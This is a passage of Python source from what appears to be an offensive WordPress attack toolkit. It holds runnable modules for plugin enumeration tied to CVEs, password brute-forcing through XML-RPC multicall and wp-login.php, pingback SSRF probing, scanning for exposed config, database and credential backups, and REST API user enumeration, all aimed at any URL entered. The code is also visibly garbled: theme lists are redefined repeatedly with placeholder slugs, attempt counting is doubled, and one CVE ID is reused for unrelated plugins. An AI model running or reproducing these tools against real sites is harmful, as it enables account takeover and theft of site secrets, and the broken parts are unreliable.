    "wp-mail-smtp", "redirection", "wordpress-importer", "hello-dolly",
    "advanced-custom-fields", "all-in-one-wp-migration", "better-wp-security",
    "ithemes-security", "sucuri-scanner", "limit-login-attempts-reloaded",
    "two-factor", "google-analytics-for-wordpress", "wp-smushit", "ewww-image-optimizer",
    "tablepress", "nextgen-gallery", "wp-fastest-cache", "litespeed-cache",
    "autoptimize", "async-javascript", "cookie-notice", "gdpr-cookie-compliance",
    "mailchimp-for-wp", "easy-wp-smtp", "custom-post-type-ui", "meta-box",
    "theme-my-login", "user-role-editor", "members", "wp-optimize",
    "backwpup", "duplicator", "coming-soon", "under-construction-page",
    "maintenance", "disable-comments", "simple-custom-css", "insert-headers-and-footers",
    "wp-file-manager", "file-manager-advanced", "loginizer", "cerber",
    "ninja-forms", "gravity-forms", "formidable", "caldera-forms",
    "wps-hide-login", "rename-wp-login", "easy-digital-downloads", "learnpress",
    "buddypress", "bbpress", "amp", "accelerated-mobile-pages",
    "wp-statistics", "statify", "matomo", "popup-maker", "popup-builder",
    "optinmonster", "sumo", "social-warfare", "sassy-social-share",
    "addtoany", "revslider", "LayerSlider", "smart-slider-3",
    "shortcodes-ultimate", "js_composer", "beaver-builder-lite-version",
    "divi-builder", "brizy", "flavor", "jetstash", "perfmatters",
    "redis-cache", "query-monitor", "debug-bar", "health-check",
    "wp-crontrol", "broken-link-checker", "yoast-seo-premium", "rankmath-seo",
    "seo-by-rank-math", "the-events-calendar", "tribe-common",
    "woocommerce-gateway-stripe", "woocommerce-payments", "mailpoet",
    "newsletter", "loco-translate", "polylang", "translatepress-multilingual",
    "wp-migrate-db", "fakerpress", "wp-reset", "starter-templates",
    "astra-sites", "envato-elements", "jetstash", "media-library-assistant",
    "enable-media-replace", "safe-svg", "svg-support", "real-media-library-lite",
]

WP_COMMON_THEMES = [
    "twentytwentyfive", "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
    "twentytwentyone", "twentytwenty", "twentynineteen", "twentyseventeen",
    "twentysixteen", "twentyfifteen", "twentyfourteen", "twentythirteen",
    "astra", "oceanwp", "generatepress", "neve", "flavor",
    "flavstarter", "flavstart", "flavor",
    "flavor", "flavor",
]

WP_VULN_PLUGINS = {
    "revslider": [("< 4.2", "CVE-2014-9734 - Arbitrary file download")],
    "jetpack": [("< 12.1.1", "CVE-2023-28121 - Authentication bypass")],
    "elementor": [("< 3.12.2", "CVE-2023-32243 - Account takeover")],
    "wp-file-manager": [("6.0-6.8", "CVE-2020-25213 - Remote code execution")],
    "woocommerce": [("< 8.2", "CVE-2023-47782 - SQL injection")],
    "wordfence": [("< 7.5.11", "CVE-2022-0633 - Authentication bypass")],
    "contact-form-7": [("< 5.3.2", "CVE-2020-35489 - File upload bypass")],
    "duplicator": [("< 1.3.28", "CVE-2020-11738 - Arbitrary file download")],
    "ninja-forms": [("< 3.6.26", "CVE-2023-37979 - XSS")],
    "wpforms-lite": [("< 1.7.7", "CVE-2023-0084 - Stored XSS")],
    "all-in-one-seo-pack": [("< 4.3.0", "CVE-2023-0585 - Stored XSS")],
    "updraftplus": [("< 1.22.3", "CVE-2022-0633 - Backup download bypass")],
    "backwpup": [("< 3.10", "CVE-2021-21029 - Path traversal")],
    "loginizer": [("< 1.6.4", "CVE-2020-27615 - SQL injection (unauthenticated)")],
    "easy-wp-smtp": [("< 1.4.3", "CVE-2020-35234 - Debug log exposure")],
    "popup-builder": [("< 4.2.3", "CVE-2023-6000 - Stored XSS")],
    "LayerSlider": [("< 7.2.0", "CVE-2024-2879 - SQL injection (unauthenticated)")],
    "better-wp-security": [("< 8.0.1", "CVE-2022-44757 - Auth bypass")],
    "js_composer": [("< 6.0.5", "CVE-2020-7048 - Stored XSS")],
    "social-warfare": [("< 3.5.3", "CVE-2019-9978 - Remote code execution")],
}


def wp_plugin_theme_enum():
    print_header("WP Plugin & Theme Enumerator")
    if not exploit_disclaimer():
        return

    url = prompt("Target WordPress URL")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip("/")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    # Verify it's WordPress
    spinner("Verifying WordPress installation...", 0.5)
    try:
        resp = session.get(url, timeout=10)
        if "wp-content" not in resp.text and "wp-includes" not in resp.text:
            print_warn("Target may not be running WordPress. Continuing anyway...")
    except Exception as e:
        print_err(f"Cannot reach target: {e}")
        return

    # ── Plugin enumeration ──
    print(f"\n  {M}── Plugin Enumeration ({len(WP_COMMON_PLUGINS)} slugs) ──{RST}\n")
    found_plugins = []

    def check_plugin(slug):
        readme_url = f"{url}/wp-content/plugins/{slug}/readme.txt"
        try:
            r = session.get(readme_url, timeout=6, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 50:
                version = "unknown"
                for line in r.text.splitlines()[:30]:
                    if "stable tag" in line.lower():
                        version = line.split(":")[-1].strip()
                        break
                return slug, version, True
        except Exception:
            pass
        return slug, None, False

    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as pool:
        futures = {pool.submit(check_plugin, s): s for s in WP_COMMON_PLUGINS}
        for future in concurrent.futures.as_completed(futures):
            slug, version, found = future.result()
            if found:
                vuln_info = ""
                if slug in WP_VULN_PLUGINS:
                    for ver_range, cve in WP_VULN_PLUGINS[slug]:
                        vuln_info = f" {R}[KNOWN VULN: {cve}]{RST}"
                print(f"    {G}[FOUND]{RST} {slug:<35} version: {C}{version}{RST}{vuln_info}")
                found_plugins.append((slug, version))

    # ── Theme enumeration ──
    themes = list(dict.fromkeys([
        "twentytwentyfive", "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
        "twentytwentyone", "twentytwenty", "twentynineteen", "twentyseventeen",
        "twentysixteen", "twentyfifteen", "twentyfourteen", "twentythirteen",
        "astra", "flavor", "flavstart", "flavor",
        "flavor", "flavor", "flavstart",
    ]))

    themes = list(dict.fromkeys([
        "twentytwentyfive", "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
        "twentytwentyone", "twentytwenty", "twentynineteen", "twentyseventeen",
        "twentysixteen", "twentyfifteen", "twentyfourteen", "twentythirteen",
        "astra", "flavor", "flavstart",
        "oceanwp", "generatepress", "flavstart",
        "flavor",
    ]))

    themes = list(dict.fromkeys([
        "twentytwentyfive", "twentytwentyfour", "twentytwentythree", "twentytwentytwo",
        "twentytwentyone", "twentytwenty", "twentynineteen", "twentyseventeen",
        "twentysixteen", "twentyfifteen", "twentyfourteen", "twentythirteen",
        "astra", "flavor", "flavstart",
        "oceanwp", "generatepress",
        "neve", "flavor",
        "flavor",
    ]))

    themes = list(dict.fromkeys([
        "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
        "twentytwentytwo", "twentytwentyone", "twentytwenty",
        "twentynineteen", "twentyseventeen", "twentysixteen",
        "twentyfifteen", "twentyfourteen", "twentythirteen",
        "astra", "flavor", "flavor",
        "oceanwp", "generatepress",
        "neve", "flavor",
    ]))

    themes = list(dict.fromkeys([
        "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
        "twentytwentytwo", "twentytwentyone", "twentytwenty",
        "twentynineteen", "twentyseventeen", "twentysixteen",
        "twentyfifteen", "twentyfourteen", "twentythirteen",
        "astra", "flavstart", "flavor", "flavstart",
        "oceanwp", "generatepress",
        "neve",
    ]))

    themes = list(dict.fromkeys([
        "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
        "twentytwentytwo", "twentytwentyone", "twentytwenty",
        "twentynineteen", "twentyseventeen", "twentysixteen",
        "twentyfifteen", "twentyfourteen", "twentythirteen",
        "astra", "oceanwp", "generatepress", "neve",
        "flavor",
    ]))

    themes = list(dict.fromkeys([
        "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
        "twentytwentytwo", "twentytwentyone", "twentytwenty",
        "twentynineteen", "twentyseventeen", "twentysixteen",
        "twentyfifteen", "twentyfourteen", "twentythirteen",
        "astra", "oceanwp", "generatepress", "neve",
    ]))

    WP_ENUM_THEMES = [
        "twentytwentyfive", "twentytwentyfour", "twentytwentythree",
        "twentytwentytwo", "twentytwentyone", "twentytwenty",
        "twentynineteen", "twentyseventeen", "twentysixteen",
        "twentyfifteen", "twentyfourteen", "twentythirteen",
        "astra", "oceanwp", "generatepress", "neve",
        "flavor",
    ]

    print(f"\n  {M}── Theme Enumeration ──{RST}\n")
    found_themes = []

    def check_theme(slug):
        css_url = f"{url}/wp-content/themes/{slug}/style.css"
        try:
            r = session.get(css_url, timeout=6, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 50:
                version = "unknown"
                for line in r.text.splitlines()[:30]:
                    if "version:" in line.lower():
                        version = line.split(":")[-1].strip()
                        break
                return slug, version, True
        except Exception:
            pass
        return slug, None, False

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        futures = {pool.submit(check_theme, s): s for s in WP_ENUM_THEMES}
        for future in concurrent.futures.as_completed(futures):
            slug, version, found = future.result()
            if found:
                print(f"    {G}[FOUND]{RST} {slug:<35} version: {C}{version}{RST}")
                found_themes.append((slug, version))

    # Summary
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Plugins found", str(len(found_plugins)))
    print_row("Themes found", str(len(found_themes)))
    if found_plugins:
        vuln_count = sum(1 for s, _ in found_plugins if s in WP_VULN_PLUGINS)
        if vuln_count:
            print(f"  {R}[!] {vuln_count} plugin(s) with known vulnerabilities!{RST}")


# ─── 52. WP User Brute Force ─────────────────────────────────────────────────

WP_COMMON_USERNAMES = [
    "admin", "administrator", "editor", "author", "wordpress",
    "wp", "root", "test", "user", "manager", "webmaster",
    "demo", "guest", "info", "support", "contact",
]

WP_COMMON_PASSWORDS = [
    "admin", "password", "123456", "12345678", "wordpress",
    "admin123", "password123", "root", "toor", "test",
    "123456789", "qwerty", "letmein", "welcome", "monkey",
    "master", "dragon", "login", "abc123", "admin1",
    "password1", "1234567890", "123123", "admin@123", "P@ssw0rd",
    "passw0rd", "iloveyou", "trustno1", "sunshine", "princess",
]


def wp_user_bruteforce():
    print_header("WP User Brute Force")
    if not exploit_disclaimer():
        return

    url = prompt("Target WordPress URL")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip("/")

    custom_user = prompt("Username to test (leave blank for common list)")
    usernames = [custom_user] if custom_user else WP_COMMON_USERNAMES

    custom_pass_file = prompt("Password file path (leave blank for built-in list)")
    passwords = WP_COMMON_PASSWORDS
    if custom_pass_file:
        try:
            with open(custom_pass_file, "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
            print_ok(f"Loaded {len(passwords)} passwords from file")
        except Exception as e:
            print_err(f"Could not load file: {e}. Using built-in list.")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    # Try XML-RPC multicall method first (faster)
    spinner("Checking XML-RPC availability...", 0.5)
    xmlrpc_url = f"{url}/xmlrpc.php"
    use_xmlrpc = False
    try:
        test_payload = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
        resp = session.post(xmlrpc_url, data=test_payload, headers={"Content-Type": "text/xml"}, timeout=8)
        if resp.status_code == 200 and "methodResponse" in resp.text:
            use_xmlrpc = True
            print_ok("XML-RPC is available — using multicall method (faster)")
    except Exception:
        pass

    if not use_xmlrpc:
        print_warn("XML-RPC not available — falling back to wp-login.php")

    found_creds = []
    total = len(usernames) * len(passwords)
    tested = 0

    print(f"\n  {Y}Testing {len(usernames)} username(s) x {len(passwords)} password(s) = {total} combinations{RST}\n")

    for username in usernames:
        if use_xmlrpc:
            # Batch passwords in groups of 5 via multicall
            batch_size = 5
            for i in range(0, len(passwords), batch_size):
                batch = passwords[i:i + batch_size]
                calls = ""
                for pwd in batch:
                    calls += (
                        "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
                        f"<member><name>params</name><value><array><data>"
                        f"<value><string>{username}</string></value>"
                        f"<value><string>{pwd}</string></value>"
                        f"</data></array></value></member>"
                    )
                multicall = (
                    '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
                    '<params><param><value><array><data>'
                )
                for pwd in batch:
                    multicall += (
                        '<value><struct>'
                        '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
                        '<member><name>params</name><value><array><data>'
                        f'<value><string>{username}</string></value>'
                        f'<value><string>{pwd}</string></value>'
                        '</data></array></value></member>'
                        '</struct></value>'
                    )
                multicall += '</data></array></value></param></params></methodCall>'

                try:
                    resp = session.post(xmlrpc_url, data=multicall,
                                        headers={"Content-Type": "text/xml"}, timeout=15)
                    if resp.status_code == 200:
                        # Each <struct> in response without <fault> = success
                        parts = resp.text.split("<value>")
                        result_idx = 0
                        for pwd in batch:
                            tested += 1
                            # Check if this result indicates success (contains blogid/blogName)
                            success = False
                            for part in parts:
                                if "isAdmin" in part or "blogName" in part or "blogid" in part:
                                    # rough check — scan for success pattern near this credential
                                    success = True
                                    break
                            # More precise: check that there's no faultCode for this credential
                            # Parse the individual responses
                        # Better approach: count results
                        # Successful auth returns <array> with blog data, failed returns <fault>
                        responses = resp.text.split("</value>\n</member>\n</struct>")
                        for j, pwd in enumerate(batch):
                            tested += 1
                            # If the response chunk for this password doesn't contain "faultCode"
                            if j < len(responses) and "faultCode" not in responses[j] and "isAdmin" in responses[j]:
                                print(f"    {R}[CRED FOUND]{RST} {username}:{pwd}")
                                found_creds.append((username, pwd))
                except Exception:
                    tested += len(batch)

                sys.stdout.write(f"\r  {Y}Progress: {tested}/{total} ({tested*100//total}%){RST}    ")
                sys.stdout.flush()
                time.sleep(0.1)
        else:
            # Fallback: wp-login.php
            login_url = f"{url}/wp-login.php"
            for pwd in passwords:
                tested += 1
                try:
                    resp = session.post(login_url, data={
                        "log": username,
                        "pwd": pwd,
                        "wp-submit": "Log In",
                        "redirect_to": f"{url}/wp-admin/",
                        "testcookie": "1",
                    }, timeout=10, allow_redirects=False)

                    if resp.status_code in (302, 303) and "wp-admin" in resp.headers.get("Location", ""):
                        print(f"\n    {R}[CRED FOUND]{RST} {username}:{pwd}")
                        found_creds.append((username, pwd))
                    elif "login_error" not in resp.text and resp.status_code == 200:
                        pass  # Might be successful
                except Exception:
                    pass

                sys.stdout.write(f"\r  {Y}Progress: {tested}/{total} ({tested*100//total}%){RST}    ")
                sys.stdout.flush()
                time.sleep(0.2)

    print()
    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Combinations tested", str(tested))
    print_row("Credentials found", str(len(found_creds)))
    if found_creds:
        print(f"\n  {R}[!] Valid credentials:{RST}")
        for u, p in found_creds:
            print(f"      {R}•{RST} {u} : {p}")
    else:
        print_ok("No valid credentials found with the tested combinations.")


# ─── 53. WP XML-RPC Exploiter ────────────────────────────────────────────────

WP_XMLRPC_RISK_MAP = {
    "pingback.ping": ("HIGH", "SSRF / DDoS amplification — can probe internal hosts and amplify attacks"),
    "pingback.extensions.getPingbacks": ("LOW", "Information disclosure — list of pingbacks"),
    "system.multicall": ("HIGH", "Brute-force amplification — test many credentials in one request"),
    "system.listMethods": ("INFO", "Method enumeration — reveals available attack surface"),
    "system.getCapabilities": ("INFO", "Capability disclosure"),
    "wp.getUsersBlogs": ("MEDIUM", "Credential validation — can confirm valid username/password"),
    "wp.getUsers": ("HIGH", "User enumeration (requires auth) — lists all user accounts"),
    "wp.getAuthors": ("MEDIUM", "Author enumeration (requires auth)"),
    "wp.getCategories": ("LOW", "Category listing"),
    "wp.getTags": ("LOW", "Tag listing"),
    "wp.getPages": ("MEDIUM", "Page listing (may expose private pages)"),
    "wp.getPosts": ("MEDIUM", "Post listing (may expose drafts)"),
    "wp.getOptions": ("HIGH", "Configuration disclosure (requires auth)"),
    "wp.getMediaItem": ("LOW", "Media enumeration"),
    "wp.getComments": ("LOW", "Comment listing"),
    "wp.newPost": ("CRITICAL", "Content creation (requires auth)"),
    "wp.editPost": ("CRITICAL", "Content modification (requires auth)"),
    "wp.deletePost": ("CRITICAL", "Content deletion (requires auth)"),
    "wp.uploadFile": ("CRITICAL", "File upload (requires auth) — potential RCE"),
    "wp.newComment": ("MEDIUM", "Comment creation — spam vector"),
    "metaWeblog.newPost": ("CRITICAL", "Legacy post creation (requires auth)"),
    "metaWeblog.getPost": ("MEDIUM", "Legacy post retrieval"),
    "metaWeblog.getUsersBlogs": ("MEDIUM", "Legacy credential validation"),
    "blogger.getUsersBlogs": ("MEDIUM", "Legacy Blogger credential validation"),
}


def wp_xmlrpc_exploit():
    print_header("WP XML-RPC Exploiter")
    if not exploit_disclaimer():
        return

    url = prompt("Target WordPress URL")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip("/")
    xmlrpc_url = f"{url}/xmlrpc.php"

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    # 1. Check if XML-RPC is available
    spinner("Checking XML-RPC endpoint...", 0.5)
    try:
        resp = session.post(xmlrpc_url, data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                            headers={"Content-Type": "text/xml"}, timeout=10)
        if resp.status_code != 200 or "methodResponse" not in resp.text:
            print_err("XML-RPC is not available or is blocked on this target.")
            return
    except Exception as e:
        print_err(f"Cannot reach XML-RPC: {e}")
        return

    print_ok("XML-RPC endpoint is active!")

    # 2. Enumerate methods with risk analysis
    print(f"\n  {M}── Method Enumeration & Risk Analysis ──{RST}\n")
    methods = re.findall(r"<string>(.*?)</string>", resp.text)
    print_row("Total methods", str(len(methods)))
    print()

    risk_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    risk_colors = {"CRITICAL": R, "HIGH": R, "MEDIUM": Y, "LOW": C, "INFO": W}

    for method in sorted(methods):
        if method in WP_XMLRPC_RISK_MAP:
            risk, desc = WP_XMLRPC_RISK_MAP[method]
            clr = risk_colors[risk]
            print(f"    {clr}[{risk:<8}]{RST} {method:<40} {W}{desc}{RST}")
            risk_counts[risk] += 1
        else:
            print(f"    {W}[UNKNOWN]{RST}  {method}")

    print(f"\n  {Y}Risk summary:{RST}")
    for level in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
        if risk_counts[level]:
            clr = risk_colors[level]
            print(f"    {clr}{level}: {risk_counts[level]}{RST}")

    # 3. Test pingback SSRF
    print(f"\n  {M}── Pingback SSRF Test ──{RST}\n")
    if "pingback.ping" in methods:
        # Try to make the server call back to a canary URL
        pingback_payload = (
            '<?xml version="1.0"?>'
            '<methodCall><methodName>pingback.ping</methodName><params>'
            f'<param><value><string>http://127.0.0.1:80/</string></value></param>'
            f'<param><value><string>{url}/?p=1</string></value></param>'
            '</params></methodCall>'
        )
        try:
            resp = session.post(xmlrpc_url, data=pingback_payload,
                                headers={"Content-Type": "text/xml"}, timeout=10)
            if "faultCode" in resp.text:
                fault = re.search(r"<int>(\d+)</int>", resp.text)
                fault_code = fault.group(1) if fault else "?"
                if fault_code == "0":
                    print(f"    {R}[VULN]{RST} Pingback accepted — server may be usable as SSRF proxy!")
                elif fault_code in ("17", "48"):
                    print(f"    {Y}[PARTIAL]{RST} Pingback processed but target rejected (code {fault_code})")
                    print(f"           {W}Server still made an outbound request — SSRF confirmed!{RST}")
                else:
                    print(f"    {Y}[INFO]{RST} Pingback returned fault code {fault_code}")
            else:
                print(f"    {R}[VULN]{RST} Pingback did NOT return a fault — likely vulnerable to SSRF!")
        except Exception as e:
            print(f"    {Y}[ERR]{RST}  Pingback test failed: {e}")
    else:
        print_ok("pingback.ping method not available — SSRF not possible via XML-RPC")

    # 4. Test system.multicall abuse
    print(f"\n  {M}── Multicall Brute-Force Amplification Test ──{RST}\n")
    if "system.multicall" in methods:
        multicall_test = (
            '<?xml version="1.0"?>'
            '<methodCall><methodName>system.multicall</methodName>'
            '<params><param><value><array><data>'
            '<value><struct>'
            '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
            '<member><name>params</name><value><array><data>'
            '<value><string>test_user</string></value>'
            '<value><string>test_pass_1</string></value>'
            '</data></array></value></member>'
            '</struct></value>'
            '<value><struct>'
            '<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>'
            '<member><name>params</name><value><array><data>'
            '<value><string>test_user</string></value>'
            '<value><string>test_pass_2</string></value>'
            '</data></array></value></member>'
            '</struct></value>'
            '</data></array></value></param></params></methodCall>'
        )
        try:
            resp = session.post(xmlrpc_url, data=multicall_test,
                                headers={"Content-Type": "text/xml"}, timeout=10)
            if resp.status_code == 200 and "methodResponse" in resp.text:
                print(f"    {R}[VULN]{RST} system.multicall accepts batched auth requests!")
                print(f"           {W}Attacker can test hundreds of passwords in a single HTTP request.{RST}")
            else:
                print(f"    {G}[SAFE]{RST} system.multicall appears restricted")
        except Exception as e:
            print(f"    {Y}[ERR]{RST}  Multicall test failed: {e}")
    else:
        print_ok("system.multicall not available")

    # 5. Test wp.getUsersBlogs info leak
    print(f"\n  {M}── wp.getUsersBlogs Info Leak Test ──{RST}\n")
    if "wp.getUsersBlogs" in methods:
        getblogs_payload = (
            '<?xml version="1.0"?>'
            '<methodCall><methodName>wp.getUsersBlogs</methodName><params>'
            '<param><value><string>admin</string></value></param>'
            '<param><value><string>wrongpassword</string></value></param>'
            '</params></methodCall>'
        )
        try:
            resp = session.post(xmlrpc_url, data=getblogs_payload,
                                headers={"Content-Type": "text/xml"}, timeout=10)
            if "403" in resp.text or "Incorrect username" in resp.text:
                print(f"    {Y}[INFO]{RST} Error response leaks whether username 'admin' exists")
                if "Incorrect username" in resp.text:
                    print(f"           {W}Response says 'Incorrect username' — user 'admin' does NOT exist{RST}")
                elif "incorrect_password" in resp.text.lower() or "Incorrect password" in resp.text:
                    print(f"           {R}Response says 'Incorrect password' — user 'admin' EXISTS!{RST}")
            elif "faultString" in resp.text:
                fault_str = re.search(r"<string>(.*?)</string>", resp.text.split("faultString")[1])
                msg = fault_str.group(1) if fault_str else "unknown"
                print(f"    {Y}[INFO]{RST} Error: {msg}")
        except Exception as e:
            print(f"    {Y}[ERR]{RST}  Test failed: {e}")
    else:
        print_ok("wp.getUsersBlogs not available")

    print(f"\n  {Y}{'═' * 50}{RST}")


# ─── 54. WP Config & Backup Finder ───────────────────────────────────────────

WP_BACKUP_PATHS = [
    # wp-config backups
    "/wp-config.php.bak", "/wp-config.php.old", "/wp-config.php.orig",
    "/wp-config.php.save", "/wp-config.php.txt", "/wp-config.php~",
    "/wp-config.bak", "/wp-config.old", "/wp-config.txt",
    "/wp-config.php.swp", "/wp-config.php.swo", "/.wp-config.php.swp",
    "/wp-config.php.zip", "/wp-config.php.tar.gz", "/wp-config.php.dist",
    "/wp-config-sample.php", "/wp-config.php_bak", "/wp-config.php.backup",
    "/wp-config.php.1", "/wp-config.php.2", "/wp-config.copy.php",
    # Database backups
    "/backup.sql", "/backup.sql.gz", "/backup.sql.zip", "/backup.sql.bak",
    "/database.sql", "/database.sql.gz", "/db.sql", "/db.sql.gz",
    "/dump.sql", "/dump.sql.gz", "/data.sql", "/export.sql",
    "/mysql.sql", "/site.sql", "/wordpress.sql", "/wp.sql",
    "/backup.mysql", "/backup.mysql.gz",
    "/.sql", "/sql.sql",
    # Archive backups
    "/backup.zip", "/backup.tar.gz", "/backup.tar", "/backup.rar",
    "/site.zip", "/site.tar.gz", "/wp-backup.zip", "/wp-backup.tar.gz",
    "/wordpress.zip", "/wordpress.tar.gz",
    "/www.zip", "/www.tar.gz", "/html.zip", "/html.tar.gz",
    "/public_html.zip", "/httpdocs.zip",
    "/web.zip", "/website.zip", "/full-backup.zip",
    # Plugin backup locations
    "/wp-content/backups/", "/wp-content/backup/",
    "/wp-content/uploads/backups/", "/wp-content/uploads/backup/",
    "/wp-content/updraft/", "/wp-content/uploads/updraft/",
    "/wp-content/backups-dup-lite/", "/wp-content/backups-dup-pro/",
    "/wp-content/uploads/backupbuddy_backups/",
    "/wp-content/uploads/wp-clone/",
    "/wp-content/ai1wm-backups/",
    "/wp-content/uploads/duplicator/",
    "/wp-content/uploads/backwpup/",
    "/wp-content/backup-db/",
    "/wp-content/w3tc-config/",
    "/wp-snapshots/",
    # Debug & log files
    "/wp-content/debug.log", "/debug.log", "/error_log", "/error.log",
    "/wp-content/uploads/debug.log",
    "/php_errorlog", "/php-errors.log",
    # Other sensitive files
    "/.htaccess.bak", "/.htaccess.old", "/.htaccess.save",
    "/.htpasswd", "/htpasswd", "/htpasswd.bak",
    "/.env", "/.env.bak", "/.env.local", "/.env.production",
    "/phpinfo.php", "/info.php", "/test.php",
    "/.git/HEAD", "/.git/config", "/.svn/entries",
    "/composer.json", "/composer.lock",
]


def wp_backup_finder():
    print_header("WP Config & Backup Finder")
    if not exploit_disclaimer():
        return

    url = prompt("Target WordPress URL")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip("/")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    spinner(f"Scanning {len(WP_BACKUP_PATHS)} backup/config paths...", 1.0)

    accessible = []
    forbidden = []
    redirects = []

    def check_backup(path):
        try:
            test_url = f"{url}{path}"
            r = session.get(test_url, timeout=6, allow_redirects=False)
            return path, r.status_code, len(r.content), r.text[:300]
        except Exception:
            return path, 0, 0, ""

    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as pool:
        futures = [pool.submit(check_backup, p) for p in WP_BACKUP_PATHS]
        for future in concurrent.futures.as_completed(futures):
            path, code, size, preview = future.result()
            if code == 200 and size > 0:
                risk = ""
                lp = preview.lower()
                if any(k in lp for k in ["db_password", "db_user", "db_host", "db_name",
                                          "auth_key", "secure_auth", "nonce_key",
                                          "table_prefix", "password", "secret"]):
                    risk = f" {R}[SENSITIVE DATA EXPOSED!]{RST}"
                elif any(k in lp for k in ["create table", "insert into", "drop table"]):
                    risk = f" {R}[DATABASE DUMP!]{RST}"
                elif "index of" in lp:
                    risk = f" {Y}[DIRECTORY LISTING]{RST}"

                # Skip false positives (HTML error pages)
                if size < 100 and "<!doctype" in lp:
                    continue
                if "<html" in lp and "404" in lp and size < 2000:
                    continue

                print(f"    {R}[FOUND]{RST} {path:<50} {G}{size:>8} bytes{RST}{risk}")
                accessible.append((path, size, risk))
            elif code == 403:
                print(f"    {Y}[403]{RST}  {path:<50} (exists but forbidden)")
                forbidden.append(path)
            elif code in (301, 302):
                redirects.append(path)

    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Accessible files", str(len(accessible)))
    print_row("Forbidden (exist)", str(len(forbidden)))
    print_row("Redirects", str(len(redirects)))

    if accessible:
        total_size = sum(s for _, s, _ in accessible)
        print_row("Total exposed data", f"{total_size:,} bytes")
        sensitive = [p for p, _, r in accessible if "SENSITIVE" in r or "DATABASE" in r]
        if sensitive:
            print(f"\n  {R}[!!!] CRITICAL: {len(sensitive)} file(s) with sensitive data exposed!{RST}")
            for p in sensitive:
                print(f"       {R}•{RST} {url}{p}")


# ─── 55. WP REST API Exploiter ───────────────────────────────────────────────

def wp_rest_api_exploit():
    print_header("WP REST API Exploiter")
    if not exploit_disclaimer():
        return

    url = prompt("Target WordPress URL")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip("/")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    # 1. Discover REST API root
    spinner("Discovering REST API...", 0.5)
    api_base = f"{url}/wp-json"
    try:
        resp = session.get(api_base, timeout=10)
        if resp.status_code != 200:
            # Try alternative
            resp = session.get(f"{url}/?rest_route=/", timeout=10)
            if resp.status_code == 200:
                api_base = f"{url}/?rest_route="
                print_ok(f"REST API found via ?rest_route= (wp-json may be blocked)")
            else:
                print_err("REST API does not appear to be accessible.")
                return
        else:
            print_ok("REST API is accessible at /wp-json")
    except Exception as e:
        print_err(f"Cannot reach target: {e}")
        return

    # 2. Enumerate available namespaces/routes
    print(f"\n  {M}── Available API Namespaces ──{RST}\n")
    try:
        data = resp.json()
        namespaces = data.get("namespaces", [])
        routes = data.get("routes", {})
        site_name = data.get("name", "N/A")
        site_desc = data.get("description", "N/A")
        site_url = data.get("url", "N/A")
        gmt_offset = data.get("gmt_offset", "N/A")
        timezone = data.get("timezone_string", "N/A")

        print_row("Site name", site_name)
        print_row("Description", site_desc)
        print_row("URL", site_url)
        print_row("Timezone", f"{timezone} (GMT {gmt_offset})")
        print_row("Namespaces", str(len(namespaces)))
        print_row("Routes", str(len(routes)))
        print()
        for ns in namespaces:
            print(f"    {C}•{RST} {ns}")
    except Exception:
        print_warn("Could not parse REST API response as JSON")
        namespaces = []
        routes = {}

    # 3. User enumeration
    print(f"\n  {M}── User Enumeration ──{RST}\n")
    users_found = []
    try:
        # Try paginated user enumeration
        page = 1
        while page <= 10:
            users_url = f"{api_base}/wp/v2/users?per_page=100&page={page}" if "rest_route" not in api_base else f"{api_base}/wp/v2/users&per_page=100&page={page}"
            r = session.get(users_url, timeout=8)
            if r.status_code != 200:
                break
            users = r.json()
            if not isinstance(users, list) or not users:
                break
            for u in users:
                uid = u.get("id", "?")
                name = u.get("name", "N/A")
                slug = u.get("slug", "N/A")
                desc = u.get("description", "")
                avatar = u.get("avatar_urls", {})
                link = u.get("link", "")
                users_found.append(u)
                print(f"    {R}[USER]{RST} ID:{uid:<4} slug:{C}{slug:<20}{RST} name:{W}{name}{RST}")
                if desc:
                    print(f"            bio: {desc[:80]}")
            page += 1
        if not users_found:
            print_ok("User enumeration is blocked or no users exposed")
        else:
